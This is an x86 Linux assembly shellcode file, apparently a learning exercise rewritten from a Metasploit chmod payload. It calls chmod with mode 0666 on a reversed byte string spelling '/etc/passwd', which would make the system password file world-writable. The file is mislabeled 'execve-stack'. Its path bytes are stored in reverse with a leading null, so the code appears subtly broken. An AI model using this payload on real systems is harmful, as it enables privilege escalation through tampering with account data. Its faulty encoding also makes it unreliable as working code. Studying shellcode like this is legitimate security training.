
; Filename: execve-stack.nasm
; Author:  Matteo Malvica
; Website:  http://www.matteomalvica.com
;
; Disassembled and rewritten from msfvenom linux/x86/chmod payload

global _start			

section .text
_start:
	cdq		 				 ; converts doubleword to quadword used to zero out EDX with one byte only
	push byte +0xf  	     ; pushes syscall 15 (sys_chmod) to the stack
	pop eax            		 ; loads the syscall into eax
	push edx                 ; pushes empty edx onto the stack as nullbyte string terminator.
	jmp short filepath       ; calls the code at offset 0x16

continue:
	pop  ebx  		 		 ; load the filepath into ebx
	push 0x1b6 		 		 ; push octal 666 onto the stack
	pop ecx    				 ; load it into ecx
	int 0x80		  		 ; run it
	push byte +0x1		     ; closing theme
	pop eax
	int 0x80

filepath:
call continue
Path: db 0x00,0x64,0x77,0x73,0x73,0x61,0x70,0x2F,0x63,0x74,0x65,0x2F
